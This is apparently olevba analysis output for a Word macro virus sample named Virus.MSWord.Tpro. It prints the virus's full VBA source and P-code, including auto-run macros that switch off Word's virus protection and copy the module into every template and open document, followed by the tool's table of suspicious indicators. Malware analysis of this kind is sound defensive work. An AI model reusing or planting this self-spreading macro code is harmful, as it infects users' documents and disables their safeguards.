olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Tpro
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Tpro - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Module1.bas 
in file: ./Virus.MSWord.Tpro - OLE stream: 'Macros/VBA/Module1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoClose()
    Application.Options.VirusProtection = False
End Sub
Sub AutoOpen()
    On Error GoTo ErrorCL
    
    Const aLin As Long = 73

    Dim aTemp As Variant
    Dim aTName As String
    Dim aTPro As Variant
    Dim aPro As Variant
    Dim aName As String
    Dim aDoc As Variant
    Dim aCodeLin As Long
    Dim aTCodeLin As Long
    
    With Application.Options
        .VirusProtection = False
        .SaveInterval = 1
    End With
    
     'D--N
    For Each aTemp In Application.Templates
        With aTemp.VBProject
            aTName = .VBComponents(1).Name
            aTCodeLin = .VBComponents("Module1").CodeModule.CountOfLines
            If aTCodeLin <> aLin Then
                For Each aTPro In .VBComponents
                    If aTPro.Name <> aTName Then
                        .VBComponents.Remove (aTPro)
                    End If
                Next aTPro
                ActiveDocument.VBProject.VBComponents("Module1").Export ("C:\Program Files\Microsoft Office\Templates\Basic.bas")
                .VBComponents.Import ("C:\Program Files\Microsoft Office\Templates\Basic.bas")
                aTemp.Save
                .VBComponents(1).Name = "ThisDocuments"
            End If
        End With
    Next aTemp
    
     'N--D
    For Each aDoc In Application.Documents
        With aDoc.VBProject
            aName = .VBComponents(1).Name
            aCodeLin = .VBComponents("Module1").CodeModule.CountOfLines
            If aCodeLin <> aLin Then
                For Each aPro In .VBComponents
                    If aPro.Name <> aName Then
                        .VBComponents.Remove (aPro)
                    End If
                Next aPro
                .VBComponents.Import ("C:\Program Files\Microsoft Office\Templates\Basic.bas")
                Application.ActiveDocument.Save
            End If
        End With
    Next aDoc
    
    Exit Sub
    
ErrorCL:
    Select Case Err.Number
        Case 53   'There is Not Basic.bas
            Application.NormalTemplate.VBProject.VBComponents("Module1").Export ("C:\Program Files\Microsoft Office\Templates\Basic.bas")
            Resume
        Case -2147352565
            aCodeLin = 0
            Resume Next
    End Select
End Sub



-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.Tpro
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 1120 bytes
' Macros/VBA/Module1 - 3906 bytes
' Line #0:
' 	FuncDefn (Sub AutoClose())
' Line #1:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemLd Options 
' 	MemSt VirusProtection 
' Line #2:
' 	EndSub 
' Line #3:
' 	FuncDefn (Sub AutoOpen())
' Line #4:
' 	OnError ErrorCL 
' Line #5:
' Line #6:
' 	Dim (Const) 
' 	LitDI2 0x0049 
' 	VarDefn aLin (As Long)
' Line #7:
' Line #8:
' 	Dim 
' 	VarDefn aTemp (As Variant)
' Line #9:
' 	Dim 
' 	VarDefn aTName (As String)
' Line #10:
' 	Dim 
' 	VarDefn aTPro (As Variant)
' Line #11:
' 	Dim 
' 	VarDefn aPro (As Variant)
' Line #12:
' 	Dim 
' 	VarDefn aName (As String)
' Line #13:
' 	Dim 
' 	VarDefn aDoc (As Variant)
' Line #14:
' 	Dim 
' 	VarDefn aCodeLin (As Long)
' Line #15:
' 	Dim 
' 	VarDefn aTCodeLin (As Long)
' Line #16:
' Line #17:
' 	StartWithExpr 
' 	Ld Application 
' 	MemLd Options 
' 	With 
' Line #18:
' 	LitVarSpecial (False)
' 	MemStWith VirusProtection 
' Line #19:
' 	LitDI2 0x0001 
' 	MemStWith SaveInterval 
' Line #20:
' 	EndWith 
' Line #21:
' Line #22:
' 	QuoteRem 0x0005 0x0004 "D--N"
' Line #23:
' 	StartForVariable 
' 	Ld aTemp 
' 	EndForVariable 
' 	Ld Application 
' 	MemLd Templates 
' 	ForEach 
' Line #24:
' 	StartWithExpr 
' 	Ld aTemp 
' 	MemLd VBProject 
' 	With 
' Line #25:
' 	LitDI2 0x0001 
' 	ArgsMemLdWith VBComponents 0x0001 
' 	MemLd New 
' 	St aTName 
' Line #26:
' 	LitStr 0x0007 "Module1"
' 	ArgsMemLdWith VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St aTCodeLin 
' Line #27:
' 	Ld aTCodeLin 
' 	Ld aLin 
' 	Ne 
' 	IfBlock 
' Line #28:
' 	StartForVariable 
' 	Ld aTPro 
' 	EndForVariable 
' 	MemLdWith VBComponents 
' 	ForEach 
' Line #29:
' 	Ld aTPro 
' 	MemLd New 
' 	Ld aTName 
' 	Ne 
' 	IfBlock 
' Line #30:
' 	Ld aTPro 
' 	Paren 
' 	MemLdWith VBComponents 
' 	ArgsMemCall Remove 0x0001 
' Line #31:
' 	EndIfBlock 
' Line #32:
' 	StartForVariable 
' 	Ld aTPro 
' 	EndForVariable 
' 	NextVar 
' Line #33:
' 	LitStr 0x0035 "C:\Program Files\Microsoft Office\Templates\Basic.bas"
' 	Paren 
' 	LitStr 0x0007 "Module1"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #34:
' 	LitStr 0x0035 "C:\Program Files\Microsoft Office\Templates\Basic.bas"
' 	Paren 
' 	MemLdWith VBComponents 
' 	ArgsMemCall Import 0x0001 
' Line #35:
' 	Ld aTemp 
' 	ArgsMemCall Save 0x0000 
' Line #36:
' 	LitStr 0x000D "ThisDocuments"
' 	LitDI2 0x0001 
' 	ArgsMemLdWith VBComponents 0x0001 
' 	MemSt New 
' Line #37:
' 	EndIfBlock 
' Line #38:
' 	EndWith 
' Line #39:
' 	StartForVariable 
' 	Ld aTemp 
' 	EndForVariable 
' 	NextVar 
' Line #40:
' Line #41:
' 	QuoteRem 0x0005 0x0004 "N--D"
' Line #42:
' 	StartForVariable 
' 	Ld aDoc 
' 	EndForVariable 
' 	Ld Application 
' 	MemLd Documents 
' 	ForEach 
' Line #43:
' 	StartWithExpr 
' 	Ld aDoc 
' 	MemLd VBProject 
' 	With 
' Line #44:
' 	LitDI2 0x0001 
' 	ArgsMemLdWith VBComponents 0x0001 
' 	MemLd New 
' 	St aName 
' Line #45:
' 	LitStr 0x0007 "Module1"
' 	ArgsMemLdWith VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St aCodeLin 
' Line #46:
' 	Ld aCodeLin 
' 	Ld aLin 
' 	Ne 
' 	IfBlock 
' Line #47:
' 	StartForVariable 
' 	Ld aPro 
' 	EndForVariable 
' 	MemLdWith VBComponents 
' 	ForEach 
' Line #48:
' 	Ld aPro 
' 	MemLd New 
' 	Ld aName 
' 	Ne 
' 	IfBlock 
' Line #49:
' 	Ld aPro 
' 	Paren 
' 	MemLdWith VBComponents 
' 	ArgsMemCall Remove 0x0001 
' Line #50:
' 	EndIfBlock 
' Line #51:
' 	StartForVariable 
' 	Ld aPro 
' 	EndForVariable 
' 	NextVar 
' Line #52:
' 	LitStr 0x0035 "C:\Program Files\Microsoft Office\Templates\Basic.bas"
' 	Paren 
' 	MemLdWith VBComponents 
' 	ArgsMemCall Import 0x0001 
' Line #53:
' 	Ld Application 
' 	MemLd ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #54:
' 	EndIfBlock 
' Line #55:
' 	EndWith 
' Line #56:
' 	StartForVariable 
' 	Ld aDoc 
' 	EndForVariable 
' 	NextVar 
' Line #57:
' Line #58:
' 	ExitSub 
' Line #59:
' Line #60:
' 	Label ErrorCL 
' Line #61:
' 	Ld Err 
' 	MemLd Number 
' 	SelectCase 
' Line #62:
' 	LitDI2 0x0035 
' 	Case 
' 	CaseDone 
' 	QuoteRem 0x0012 0x0016 "There is Not Basic.bas"
' Line #63:
' 	LitStr 0x0035 "C:\Program Files\Microsoft Office\Templates\Basic.bas"
' 	Paren 
' 	LitStr 0x0007 "Module1"
' 	Ld Application 
' 	MemLd NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #64:
' 	Resume  
' Line #65:
' 	LitDI4 0xFFF5 0x7FFD 
' 	UMi 
' 	Case 
' 	CaseDone 
' Line #66:
' 	LitDI2 0x0000 
' 	St aCodeLin 
' Line #67:
' 	Resume (Next) 
' Line #68:
' 	EndSelect 
' Line #69:
' 	EndSub 
' Line #70:
' Line #71:
' Line #72:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Hex String|!G5%e               |2147352565                                   |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

